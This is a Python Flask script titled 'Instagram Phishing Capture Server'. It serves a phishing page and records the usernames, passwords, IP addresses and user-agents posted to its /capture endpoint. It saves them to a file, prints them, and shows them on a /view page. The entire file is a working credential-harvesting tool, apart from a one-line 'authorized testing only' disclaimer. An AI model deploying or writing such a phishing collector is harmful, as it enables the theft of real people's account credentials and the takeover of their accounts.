#!/usr/bin/env python3

from flask import Flask, request, jsonify, send_from_directory, render_template_string
import argparse
import json
import os
import sys
from datetime import datetime

app = Flask(__name__, static_folder=None)

# Configuration
CAPTURES_FILE = "captures.txt"
WEB_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'web')

@app.route('/')
def index():
    """Serve the phishing page"""
    return send_from_directory(WEB_DIR, 'index.html')

@app.route('/capture', methods=['POST'])
def capture():
    """Receive captured credentials"""
    try:
        data = request.get_json(force=True)
        
        # Add timestamp
        data['received_at'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        data['remote_ip'] = request.remote_addr
        
        # Save to file
        with open(CAPTURES_FILE, 'a') as f:
            f.write(json.dumps(data, indent=2))
            f.write('\n' + '='*50 + '\n')
        
        print(f"\n[+] CAPTURED CREDENTIALS at {data['received_at']}")
        print(f"    IP: {data['remote_ip']}")
        print(f"    Username: {data.get('username', 'N/A')}")
        print(f"    Password: {data.get('password', 'N/A')}")
        if 'verifyPassword' in data:
            print(f"    Verify Password: {data['verifyPassword']}")
        print(f"    User-Agent: {data.get('userAgent', 'N/A')[:50]}...")
        print(f"[+] Saved to {CAPTURES_FILE}")
        
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        print(f"[-] Error capturing: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/view')
def view_captures():
    """View captured credentials in browser"""
    if not os.path.exists(CAPTURES_FILE):
        return "<h2>No captures yet</h2>"
    
    with open(CAPTURES_FILE, 'r') as f:
        content = f.read()
    
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Captured Credentials</title>
        <style>
            body { font-family: monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }
            pre { white-space: pre-wrap; word-wrap: break-word; }
            .entry { margin: 20px 0; padding: 10px; border: 1px solid #333; border-radius: 5px; }
            h2 { color: #ff4444; }
            .refresh { position: fixed; top: 10px; right: 10px; }
            .refresh a { color: #fff; background: #333; padding: 10px 20px; border-radius: 5px; text-decoration: none; }
        </style>
    </head>
    <body>
        <div class="refresh"><a href="/view">&#8635; Refresh</a></div>
        <h2>Captured Credentials</h2>
        <pre>""" + content + """</pre>
    </body>
    </html>
    """
    return html

@app.route('/clear')
def clear_captures():
    """Clear all captured data"""
    if os.path.exists(CAPTURES_FILE):
        os.remove(CAPTURES_FILE)
    return "Captures cleared."

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Instagram Phishing Capture Server')
    parser.add_argument('--host', default='127.0.0.1', help='Host to bind to')
    parser.add_argument('--port', type=int, default=8080, help='Port to listen on')
    args = parser.parse_args()
    
    print(f"""
    ╔═══════════════════════════════════════════╗
    ║     Instagram Phishing Capture Server     ║
    ╚═══════════════════════════════════════════╝
    
    [*] Server running on http://{args.host}:{args.port}
    [*] Phishing page: http://{args.host}:{args.port}/
    [*] View captures: http://{args.host}:{args.port}/view
    [*] Clear captures: http://{args.host}:{args.port}/clear
    [*] Captures saved to: {CAPTURES_FILE}
    
    [!] FOR AUTHORIZED TESTING ONLY
    """)
    
    app.run(host=args.host, port=args.port, debug=False)